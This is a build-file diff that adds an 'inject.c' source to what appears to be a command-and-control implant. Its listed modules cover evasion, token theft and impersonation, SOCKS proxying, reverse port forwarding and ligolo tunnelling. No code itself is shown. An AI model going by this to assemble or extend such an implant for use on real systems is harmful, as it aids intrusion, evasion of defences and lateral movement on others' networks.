@@ -9,7 +9,8 @@ SRC = main.c Checkin.c utils.c crypto.c evasion.c \
       command_steal_token.c command_make_token.c command_runas.c command_rev2self.c \
       command_socks.c socks.c command_rportfwd.c \
       command_ligolo.c \
-      command_spawn.c
+      command_spawn.c \
+      inject.c
 
 # Crypto backend: USE_BCRYPT (default) or USE_TINY_AES
 # Set via CFLAGS=-DUSE_TINY_AES by builder.py
